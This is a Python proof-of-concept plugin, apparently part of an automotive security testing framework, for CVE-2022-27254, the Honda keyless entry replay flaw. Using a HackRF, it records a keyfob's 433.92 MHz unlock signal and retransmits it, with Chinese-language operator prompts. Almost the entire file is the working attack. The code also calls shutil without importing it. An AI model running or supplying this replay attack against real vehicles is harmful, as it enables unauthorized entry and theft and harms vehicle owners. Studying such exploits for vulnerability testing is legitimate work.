"""
PoC Name: RF Keyfob Signal Replay
CVE: CVE-2022-27254
Component: Multiple
Category: Advanced
Severity: High
CVSS: 6.5
Description: 录制/重放433.92MHz钥匙遥控解锁信号
Prerequisites: 支持SDR收发硬件环境 (如 HackRF, rpitx等)
Usage: python3 62_RF_Keyfob_Replay.py <args>
"""
import subprocess
import sys
import os
from iv_plugin_base import IVIVulnerabilityPlugin

class HondaReplayPlugin(IVIVulnerabilityPlugin):
    """
    CVE-2022-27254: Honda Keyless Entry Replay Attack
    """
    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "CVE-2022-27254"
        self.freq = "433920000" # 433.92 MHz
        self.sample_rate = "2000000"
        self.file_name = "signal.raw"

    def check_prerequisites(self):
        # 检查 hackrf_transfer 工具是否存在
        if shutil.which("hackrf_transfer") is None:
            self.logger.error("未找到 hackrf_transfer 工具。")
            return False
        return True

    def exploit(self):
        self.logger.info("请准备好 HackRF 设备。")
        input("按 Enter 键开始录制信号（请在此时按下车钥匙解锁键）...")
        
        # 1. 录制信号
        self.logger.info("正在录制信号 (5秒)...")
        try:
            # -r 接收, -f 频率, -s 采样率, -n 采样数 (2M * 5s = 10M samples)
            subprocess.run(["hackrf_transfer", "-r", self.file_name, "-f", self.freq, "-s", self.sample_rate, "-n", "10000000"], check=True)
            self.logger.info("信号录制完成。")
        except subprocess.CalledProcessError:
            self.logger.error("录制失败，请检查设备连接。")
            return self.results

        input("录制完成。请确认车辆已锁闭，按 Enter 键尝试重放攻击...")

        # 2. 重放信号
        self.logger.info("正在重放信号...")
        try:
            subprocess.run(["hackrf_transfer", "-t", self.file_name, "-f", self.freq, "-s", self.sample_rate], check=True)
            self.logger.info("重放完成。")
            
            # 询问结果
            verdict = input("车辆是否解锁？(y/n): ")
            if verdict.lower() == 'y':
                self.results["vulnerable"] = True
                self.results["evidence"] = "User confirmed vehicle unlock via replay."
            else:
                self.results["vulnerable"] = False
                self.results["evidence"] = "Replay failed to unlock vehicle."
                
        except Exception as e:
            self.logger.error(f"重放失败: {e}")
            
        # 清理
        if os.path.exists(self.file_name):
            os.remove(self.file_name)
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 62_RF_Keyfob_Replay.py <args>")
        sys.exit(1)
    plugin = HondaReplayPlugin({})
    plugin.run_verify()
